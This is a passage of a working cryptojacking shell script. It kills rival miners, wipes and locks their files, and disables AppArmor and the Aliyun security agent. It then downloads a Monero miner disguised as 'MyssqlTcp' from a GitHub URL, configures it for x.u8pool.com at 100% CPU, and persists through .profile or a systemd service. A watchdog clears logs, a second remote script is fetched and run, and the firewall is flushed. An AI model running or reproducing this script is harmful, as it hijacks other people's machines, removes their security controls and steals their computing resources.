    rm -rf /var/tmp/nadezhda.x86_64.2
    rm -rf /var/tmp/sustse3
    rm -rf /var/tmp/sustse
    rm -rf /var/tmp/moneroocean/
    rm -rf /var/tmp/devtool
    rm -rf /var/tmp/devtools
    rm -rf /var/tmp/play.sh
    rm -rf /var/tmp/systemctI
    rm -rf /var/tmp/.java
    rm -rf /var/tmp/1.sh
    rm -rf /var/tmp/conf.n
    rm -r /var/tmp/lib
    rm -r /var/tmp/.lib
    chattr -iau /tmp/lok
    chmod +700 /tmp/lok
    rm -rf /tmp/lok
    sleep 1
    chattr -i /tmp/kdevtmpfsi
    echo 1 > /tmp/kdevtmpfsi
    chattr +i /tmp/kdevtmpfsi
    sleep 1
    chattr -i /tmp/redis2
    echo 1 > /tmp/redis2
    chattr +i /tmp/redis2
    chattr -ia /.Xll/xr
    >/.Xll/xr
    chattr +ia /.Xll/xr
    chattr -ia /etc/trace
    >/etc/trace
    chattr +ia /etc/trace
    chattr -ia /etc/newsvc.sh
    chattr -ia /etc/svc*
    chattr -ia /tmp/newsvc.sh
    chattr -ia /tmp/svc*
    >/etc/newsvc.sh
    >/etc/svcupdate
    >/etc/svcguard
    >/etc/svcworkmanager
    >/etc/svcupdates
    >/tmp/newsvc.sh
    >/tmp/svcupdate
    >/tmp/svcguard
    >/tmp/svcworkmanager
    >/tmp/svcupdates
    chattr +ia /etc/newsvc.sh
    chattr +ia /etc/svc*
    chattr +ia /tmp/newsvc.sh
    chattr +ia /tmp/svc*
    sleep 1
    chattr -ia /etc/phpupdate
    chattr -ia /etc/phpguard
    chattr -ia /etc/networkmanager
    chattr -ia /etc/newdat.sh
    >/etc/phpupdate
    >/etc/phpguard
    >/etc/networkmanager
    >/etc/newdat.sh
    chattr +ia /etc/phpupdate
    chattr +ia /etc/phpguard
    chattr +ia /etc/networkmanager
    chattr +ia /etc/newdat.sh
    sleep 1
    chattr -i /usr/lib/systemd/systemd-update-daily
    echo 1 > /usr/lib/systemd/systemd-update-daily
    chattr +i /usr/lib/systemd/systemd-update-daily
    #yum install -y docker.io || apt-get install docker.io;
    docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
    docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
    docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
    docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
    #echo SELINUX=disabled >/etc/selinux/config
    service apparmor stop
    systemctl disable apparmor
    service aliyun.service stop
    systemctl disable aliyun.service
    ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
    rm -rf /usr/local/aegis
    chattr -R -ia /var/spool/cron
    chattr -ia /etc/crontab
    chattr -R -ia /etc/cron.d
    chattr -R -ia /var/spool/cron/crontabs
    crontab -r
    rm -rf /var/spool/cron/*
    rm -rf /etc/cron.d/*
    rm -rf /var/spool/cron/crontabs
    rm -rf /etc/crontab
}

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
        ls -l /proc/$procid/exe | grep /$HOME
        if [ $? -ne 1 ]
        then
            cat /proc/$procid/cmdline| grep -a -E "zzh"
            if [ $? -ne 0 ]
            then
                kill -9 $procid
            else
                echo "don't kill"
            fi
        fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
        cat /proc/$procid/cmdline| grep -a -E "zzh"
        if [ $? -ne 0 ]
        then
            kill -9 $procid
        else
            echo "don't kill"
        fi
    done
}

killall -9 xmrig
killall -9 jj
killall -9 p
killall -9 kdevtmpfsi
killall -9 SSH
killall -9 kinsing
killall -9 x86
rm -f /tmp/kdevtmpfsi
rm -f /tmp/kinsing
rm -f /tmp/SSH
rm -f /tmp/x86
kill_miner_proc
kill_sus_proc

# Cleaning system
sync && echo 3 >/proc/sys/vm/dro

# Download program
cd /$HOME/
rm -f mysqld_sysupdate
rm -f svcguard
rm -f svcupdate
rm -f svcupdates
rm -f svcworkmanager
rm -f newsvc.sh
rm -f kdevtmpfsi

mkdir myssqltcp
cd /$HOME/myssqltcp
wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
chmod 777 MyssqlTcp
chmod 777 config.json

# Write configuration
MEIP=`cat $HOME/index.html | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/-/g'`
CITY=`cat $HOME/index.html | sed 's/,/\n/g' | grep "city" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
UUIP=`uname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
UUID=`cat /proc/sys/kernel/random/uuid`
PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS"
fi

sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/myssqltcp/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$UUID':'$MEIP':'$UUIP'.'$CITY'-'$PASS'",/' $HOME/myssqltcp/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json

cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json

# preparing script
echo "[*] Creating $HOME/myssqltcp/Tcphost.sh script"
cat >$HOME/myssqltcp/Tcphost.sh <<EOL
#!/bin/bash
if ! pidof MyssqlTcp >/dev/null; then
  nice $HOME/myssqltcp/MyssqlTcp \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall MyssqlTcp\" or \"sudo killall if ! MyssqlTcp\" if you want to remove background miner first."
fi
EOL

chmod 777 $HOME/myssqltcp/Tcphost.sh

# Write guard
echo "[*] Creating $HOME/myssqltcp/lib_systemd.sh script"
cat >$HOME/myssqltcp/lib_systemd.sh <<EOL
#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

export LD_LIBRARY_PATH=$HOME/myssqltcp/

while true; do
        server=`ps aux | grep MyssqlTcp | grep -v grep`
        if [ ! "$server" ]; then
            ./addconf.sh
            /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
            sleep 10
        fi
        ./logserver.sh
        sleep 5
done
EOL

chmod 777 $HOME/myssqltcp/lib_systemd.sh

# Log removal
echo "[*] Creating $HOME/myssqltcp/logserver.sh script"
cat >$HOME/myssqltcp/logserver.sh <<EOL
#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
        ls -l /proc/$procid/exe | grep /$HOME
        if [ $? -ne 1 ]
        then
            cat /proc/$procid/cmdline| grep -a -E "MyssqlTcp"
            if [ $? -ne 0 ]
            then
                kill -9 $procid
            else
                echo "don't kill"
            fi
        fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read procid
    do
        cat /proc/$procid/cmdline| grep -a -E "MyssqlTcp"
        if [ $? -ne 0 ]
        then
            kill -9 $procid
        else
            echo "don't kill"
        fi
    done
}

killall -9 xmrig
killall -9 jj
killall -9 p
kill_sus_proc

if [ `/bin/ls -lt /$HOME/myssqlsys.log | head -1 | /bin/awk '{print $5}'` -gt $((18*18*10)) ]
then
    echo > /$HOME/myssqlsys.log
fi
 
ls *.log | xargs -I x -n 1 sh -c "echo > x”

cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
grep -q "x.u8pool.com:13777" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13777",/' $HOME/myssqltcp/config.json
EOL

chmod 777 $HOME/myssqltcp/logserver.sh

# preparing script background work and work under reboot
if ! sudo -n true 2>/dev/null; then
  if ! grep myssqltcp/Tcphost.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/myssqltcp/Tcphost.sh script to $HOME/.profile"
    echo "$HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/myssqltcp/Tcphost.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background see logs in $HOME/server.log file"
  /bin/bash $HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background see logs in $HOME/server.log file"
    /bin/bash $HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating Myssqltcp systemd service"
    cat >/$HOME/MyssqlTcp.service <<EOL
[Unit]
Description=Monero Tcphost service

[Service]
ExecStart=$HOME/myssqltcp/MyssqlTcp --config=$HOME/myssqltcp/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /$HOME/MyssqlTcp.service /etc/systemd/system/MyssqlTcp.service
    echo "[*] Starting Myssqltcp systemd service"
    sudo killall MyssqlTcp 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable MyssqlTcp.service
    sudo systemctl start MyssqlTcp.service
    echo "To see miner service logs run \"sudo journalctl -u MyssqlTcp -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e MyssqlTcp -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e MyssqlTcp -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e MyssqlTcp -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config_background.json"
fi
echo ""

cd /$HOME/
rm -f index.html
wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
chmod 777 delserver.sh
/bin/bash ./delserver.sh >/dev/null 2>&1 &

systemctl stop firewalld.service
iptables -F

echo "[*] Yes-GoGo"
